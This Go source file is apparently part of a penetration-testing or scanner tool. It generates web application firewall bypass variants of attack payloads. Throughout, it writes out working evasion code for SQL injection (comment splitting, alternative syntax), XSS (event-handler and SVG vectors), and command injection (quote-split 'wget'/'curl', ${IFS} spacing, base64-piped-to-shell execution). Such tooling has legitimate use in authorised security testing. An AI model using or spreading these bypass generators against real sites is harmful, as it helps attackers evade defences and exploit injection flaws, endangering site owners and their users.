// Package waf provides WAF detection and bypass capabilities
package waf

import (
	"encoding/base64"
	"net/url"
	"strings"
)

// BypassStrategy represents a WAF bypass attempt
type BypassStrategy struct {
	OriginalPayload string   `json:"original_payload"`
	BypassPayloads  []string `json:"bypass_payloads"`
	Technique       string   `json:"technique"`
	Rationale       string   `json:"rationale"`
}

// BypassTechnique constants
const (
	TechniqueURLEncode        = "url_encoding"
	TechniqueDoubleEncode     = "double_encoding"
	TechniqueUnicode          = "unicode"
	TechniqueCaseVariation    = "case_variation"
	TechniqueCommentInsertion = "comment_insertion"
	TechniqueStringConcat     = "string_concatenation"
	TechniqueWhitespace       = "whitespace"
	TechniqueAlternativeSyntax = "alternative_syntax"
	TechniqueFragmentation    = "fragmentation"
	TechniqueNullByte         = "null_byte"
)

// generateSQLiBypasses generates SQLi WAF bypass payloads
func generateSQLiBypasses(originalPayload string) []BypassStrategy {
	strategies := []BypassStrategy{
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueCommentInsertion,
			Rationale:       "Insert SQL comments to break pattern matching",
			BypassPayloads:  generateSQLiCommentBypasses(originalPayload),
		},
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueCaseVariation,
			Rationale:       "Use mixed case to evade case-sensitive filters",
			BypassPayloads:  generateCaseVariations(originalPayload),
		},
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueURLEncode,
			Rationale:       "URL encode special characters",
			BypassPayloads:  generateURLEncodedVariations(originalPayload),
		},
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueWhitespace,
			Rationale:       "Use alternative whitespace characters",
			BypassPayloads:  generateWhitespaceBypasses(originalPayload),
		},
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueAlternativeSyntax,
			Rationale:       "Use alternative SQL syntax",
			BypassPayloads:  generateAlternativeSQLSyntax(originalPayload),
		},
	}

	return strategies
}

// generateXSSBypasses generates XSS WAF bypass payloads
func generateXSSBypasses(originalPayload string) []BypassStrategy {
	strategies := []BypassStrategy{
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueURLEncode,
			Rationale:       "URL encode to bypass filters",
			BypassPayloads:  generateURLEncodedVariations(originalPayload),
		},
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueUnicode,
			Rationale:       "Use unicode/hex encoding for characters",
			BypassPayloads:  generateXSSUnicodeBypasses(originalPayload),
		},
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueCaseVariation,
			Rationale:       "Mix case in HTML tags",
			BypassPayloads:  generateXSSCaseVariations(originalPayload),
		},
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueAlternativeSyntax,
			Rationale:       "Use alternative event handlers and tags",
			BypassPayloads:  generateAlternativeXSSSyntax(originalPayload),
		},
	}

	return strategies
}

// generateCommandBypasses generates command injection WAF bypass payloads
func generateCommandBypasses(originalPayload string) []BypassStrategy {
	strategies := []BypassStrategy{
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueAlternativeSyntax,
			Rationale:       "Use alternative command separators",
			BypassPayloads:  generateCommandSeparatorBypasses(originalPayload),
		},
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueStringConcat,
			Rationale:       "Use string concatenation to build commands",
			BypassPayloads:  generateCommandConcatBypasses(originalPayload),
		},
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueURLEncode,
			Rationale:       "URL encode command characters",
			BypassPayloads:  generateURLEncodedVariations(originalPayload),
		},
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueWhitespace,
			Rationale:       "Use IFS and alternative whitespace",
			BypassPayloads:  generateCommandWhitespaceBypasses(originalPayload),
		},
	}

	return strategies
}

// generateGenericBypasses generates generic bypass payloads
func generateGenericBypasses(originalPayload string) []BypassStrategy {
	strategies := []BypassStrategy{
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueURLEncode,
			Rationale:       "URL encode to bypass filters",
			BypassPayloads:  generateURLEncodedVariations(originalPayload),
		},
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueDoubleEncode,
			Rationale:       "Double URL encode to bypass decode-check-encode flows",
			BypassPayloads:  generateDoubleEncodedVariations(originalPayload),
		},
		{
			OriginalPayload: originalPayload,
			Technique:       TechniqueCaseVariation,
			Rationale:       "Use mixed case",
			BypassPayloads:  generateCaseVariations(originalPayload),
		},
	}

	return strategies
}

// generateSQLiCommentBypasses inserts SQL comments to break patterns
func generateSQLiCommentBypasses(payload string) []string {
	bypasses := []string{}

	// Insert inline comments
	keywords := []string{"SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE"}
	for _, keyword := range keywords {
		if strings.Contains(strings.ToUpper(payload), keyword) {
			// Insert comment in middle of keyword
			mid := len(keyword) / 2
			broken := keyword[:mid] + "/**/" + keyword[mid:]
			bypasses = append(bypasses, strings.Replace(strings.ToUpper(payload), keyword, broken, -1))

			// MySQL-specific comment
			broken = keyword[:mid] + "/*!*/" + keyword[mid:]
			bypasses = append(bypasses, strings.Replace(strings.ToUpper(payload), keyword, broken, -1))
		}
	}

	// Add comment variations
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "/**/"))
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "/*xxx*/"))

	return bypasses
}

// generateCaseVariations generates mixed case variations
func generateCaseVariations(payload string) []string {
	bypasses := []string{
		strings.ToUpper(payload),
		strings.ToLower(payload),
	}

	// Random case
	var mixed strings.Builder
	for i, c := range payload {
		if i%2 == 0 {
			mixed.WriteString(strings.ToUpper(string(c)))
		} else {
			mixed.WriteString(strings.ToLower(string(c)))
		}
	}
	bypasses = append(bypasses, mixed.String())

	// Inverse random case
	mixed.Reset()
	for i, c := range payload {
		if i%2 == 1 {
			mixed.WriteString(strings.ToUpper(string(c)))
		} else {
			mixed.WriteString(strings.ToLower(string(c)))
		}
	}
	bypasses = append(bypasses, mixed.String())

	return bypasses
}

// generateURLEncodedVariations generates URL encoded variations
func generateURLEncodedVariations(payload string) []string {
	bypasses := []string{
		url.QueryEscape(payload),
	}

	// Selective encoding
	var selective strings.Builder
	for _, c := range payload {
		if c == '\'' || c == '"' || c == '<' || c == '>' || c == '&' || c == ';' {
			selective.WriteString(url.QueryEscape(string(c)))
		} else {
			selective.WriteRune(c)
		}
	}
	if selective.String() != payload {
		bypasses = append(bypasses, selective.String())
	}

	// Hex encoding
	var hex strings.Builder
	for _, c := range payload {
		if c > 127 || c == '\'' || c == '"' || c == '<' || c == '>' {
			hex.WriteString(strings.ToUpper(url.QueryEscape(string(c))))
		} else {
			hex.WriteRune(c)
		}
	}
	if hex.String() != payload && hex.String() != selective.String() {
		bypasses = append(bypasses, hex.String())
	}

	return bypasses
}

// generateDoubleEncodedVariations generates double URL encoded variations
func generateDoubleEncodedVariations(payload string) []string {
	single := url.QueryEscape(payload)
	double := url.QueryEscape(single)

	return []string{double}
}

// generateWhitespaceBypasses generates whitespace bypass variations
func generateWhitespaceBypasses(payload string) []string {
	bypasses := []string{}

	// Tab instead of space
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "\t"))

	// Newline instead of space
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "\n"))

	// Carriage return + newline
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "\r\n"))

	// Multiple spaces
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "  "))

	// Vertical tab
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "\v"))

	// Form feed
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "\f"))

	return bypasses
}

// generateAlternativeSQLSyntax generates alternative SQL syntax bypasses
func generateAlternativeSQLSyntax(payload string) []string {
	bypasses := []string{}

	// UNION SELECT variations
	if strings.Contains(strings.ToUpper(payload), "UNION SELECT") {
		bypasses = append(bypasses, strings.Replace(payload, "UNION SELECT", "UNION ALL SELECT", 1))
		bypasses = append(bypasses, strings.Replace(payload, "UNION SELECT", "UNION DISTINCT SELECT", 1))
		bypasses = append(bypasses, strings.Replace(payload, "UNION SELECT", "UNION%0ASELECT", 1))
		bypasses = append(bypasses, strings.Replace(payload, "UNION SELECT", "UNION%0D%0ASELECT", 1))
	}

	// OR 1=1 variations
	if strings.Contains(payload, "OR 1=1") {
		bypasses = append(bypasses, strings.Replace(payload, "OR 1=1", "OR 2=2", 1))
		bypasses = append(bypasses, strings.Replace(payload, "OR 1=1", "OR 'a'='a'", 1))
		bypasses = append(bypasses, strings.Replace(payload, "OR 1=1", "OR 1 LIKE 1", 1))
		bypasses = append(bypasses, strings.Replace(payload, "OR 1=1", "OR 1<2", 1))
	}

	// AND variations
	if strings.Contains(strings.ToUpper(payload), " AND ") {
		bypasses = append(bypasses, strings.Replace(payload, " AND ", " && ", 1))
		bypasses = append(bypasses, strings.Replace(payload, " AND ", " %26%26 ", 1))
	}

	// OR variations
	if strings.Contains(strings.ToUpper(payload), " OR ") {
		bypasses = append(bypasses, strings.Replace(payload, " OR ", " || ", 1))
		bypasses = append(bypasses, strings.Replace(payload, " OR ", " %7C%7C ", 1))
	}

	return bypasses
}

// generateXSSUnicodeBypasses generates XSS unicode bypass variations
func generateXSSUnicodeBypasses(payload string) []string {
	bypasses := []string{}

	// HTML entity encoding
	encoded := strings.ReplaceAll(payload, "<", "&lt;")
	encoded = strings.ReplaceAll(encoded, ">", "&gt;")
	bypasses = append(bypasses, encoded)

	// Hex encoding
	hexEncoded := strings.ReplaceAll(payload, "<", "&#x3c;")
	hexEncoded = strings.ReplaceAll(hexEncoded, ">", "&#x3e;")
	bypasses = append(bypasses, hexEncoded)

	// Decimal encoding
	decEncoded := strings.ReplaceAll(payload, "<", "&#60;")
	decEncoded = strings.ReplaceAll(decEncoded, ">", "&#62;")
	bypasses = append(bypasses, decEncoded)

	// Unicode escapes
	unicodeEncoded := strings.ReplaceAll(payload, "<", "\\u003c")
	unicodeEncoded = strings.ReplaceAll(unicodeEncoded, ">", "\\u003e")
	bypasses = append(bypasses, unicodeEncoded)

	return bypasses
}

// generateXSSCaseVariations generates XSS-specific case variations
func generateXSSCaseVariations(payload string) []string {
	bypasses := []string{}

	// Mixed case script tag
	scriptVariations := []string{
		"<ScRiPt>", "<sCrIpT>", "<SCRIPT>", "<script>",
		"<scr<script>ipt>", "<<script>script>",
	}

	for _, variant := range scriptVariations {
		if strings.Contains(strings.ToLower(payload), "<script>") {
			bypasses = append(bypasses, strings.Replace(strings.ToLower(payload), "<script>", variant, 1))
		}
	}

	// IMG tag variations
	if strings.Contains(strings.ToLower(payload), "<img") {
		bypasses = append(bypasses, strings.Replace(payload, "<img", "<ImG", 1))
		bypasses = append(bypasses, strings.Replace(payload, "<img", "<IMG", 1))
	}

	return bypasses
}

// generateAlternativeXSSSyntax generates alternative XSS syntax
func generateAlternativeXSSSyntax(payload string) []string {
	bypasses := []string{}

	// Alternative event handlers
	if strings.Contains(payload, "onerror") {
		bypasses = append(bypasses, strings.Replace(payload, "onerror", "onload", 1))
		bypasses = append(bypasses, strings.Replace(payload, "onerror", "onfocus", 1))
		bypasses = append(bypasses, strings.Replace(payload, "onerror", "onmouseover", 1))
	}

	// SVG-based XSS
	bypasses = append(bypasses, `<svg onload=alert(1)>`)
	bypasses = append(bypasses, `<svg/onload=alert(1)>`)

	// Body-based XSS
	bypasses = append(bypasses, `<body onload=alert(1)>`)

	// Marquee-based XSS
	bypasses = append(bypasses, `<marquee onstart=alert(1)>`)

	// Input-based XSS
	bypasses = append(bypasses, `<input onfocus=alert(1) autofocus>`)

	// Details-based XSS
	bypasses = append(bypasses, `<details open ontoggle=alert(1)>`)

	return bypasses
}

// generateCommandSeparatorBypasses generates command separator bypasses
func generateCommandSeparatorBypasses(payload string) []string {
	bypasses := []string{}

	separators := []string{";", "&&", "||", "|", "\n", "%0a", "%0d%0a", "`", "$()"}

	for _, sep := range separators {
		if !strings.Contains(payload, sep) {
			// Try different separators
			for _, origSep := range separators {
				if strings.Contains(payload, origSep) {
					bypasses = append(bypasses, strings.Replace(payload, origSep, sep, 1))
				}
			}
		}
	}

	return bypasses
}

// generateCommandConcatBypasses generates command concatenation bypasses
func generateCommandConcatBypasses(payload string) []string {
	bypasses := []string{}

	// Common commands to break up
	commands := map[string][]string{
		"cat":    {"c'a't", "c\"a\"t", "c\\at", "/bin/cat", "/usr/bin/cat"},
		"ls":     {"l's'", "l\"s\"", "/bin/ls", "/usr/bin/ls"},
		"id":     {"i'd'", "i\"d\"", "/bin/id", "/usr/bin/id"},
		"whoami": {"who'a'mi", "who\"a\"mi", "/bin/whoami", "/usr/bin/whoami"},
		"pwd":    {"p'w'd", "p\"w\"d"},
		"wget":   {"wg'e't", "/usr/bin/wget"},
		"curl":   {"cu'r'l", "/usr/bin/curl"},
	}

	for cmd, variations := range commands {
		if strings.Contains(payload, cmd) {
			for _, variation := range variations {
				bypasses = append(bypasses, strings.Replace(payload, cmd, variation, 1))
			}
		}
	}

	return bypasses
}

// generateCommandWhitespaceBypasses generates command injection whitespace bypasses
func generateCommandWhitespaceBypasses(payload string) []string {
	bypasses := []string{}

	// ${IFS} as space
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "${IFS}"))

	// $IFS as space
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "$IFS"))

	// {,} brace expansion
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "{,}"))

	// Tab
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "\t"))

	// < > redirection with no space
	bypasses = append(bypasses, strings.ReplaceAll(payload, " ", "<"))

	return bypasses
}

// GenerateBase64Bypasses generates base64 encoded bypass variations
func GenerateBase64Bypasses(payload string) []string {
	encoded := base64.StdEncoding.EncodeToString([]byte(payload))

	return []string{
		"echo " + encoded + " | base64 -d | sh",
		"bash -c \"$(echo " + encoded + " | base64 -d)\"",
		"eval $(echo " + encoded + " | base64 -d)",
	}
}
